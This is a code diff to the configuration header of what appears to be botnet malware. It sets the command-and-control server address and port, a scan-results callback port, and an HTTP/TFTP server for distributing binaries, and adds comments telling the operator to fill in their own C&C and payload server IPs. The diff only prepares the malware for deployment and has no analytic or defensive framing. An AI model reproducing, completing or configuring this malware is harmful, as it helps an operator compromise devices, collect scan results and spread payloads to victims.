@@ -10,13 +10,15 @@
  * ============================================================================ */
 
 // C&C Server address (IP or domain)
-#define CNC_ADDR "127.0.0.1"
+// CHANGE THIS: 0.0.0.0 is placeholder - set to your C&C server IP
+#define CNC_ADDR "0.0.0.0"
 #define CNC_PORT 3778
 
 // Scan results callback
 #define SCAN_CB_PORT 9555
 
 // HTTP/TFTP server for binaries
+// CHANGE THIS: 0.0.0.0 is placeholder - set to your HTTP server IP
 #define HTTP_SERVER "0.0.0.0"
 #define HTTP_SERVER_IP "0.0.0.0"
 #define HTTP_PORT 80
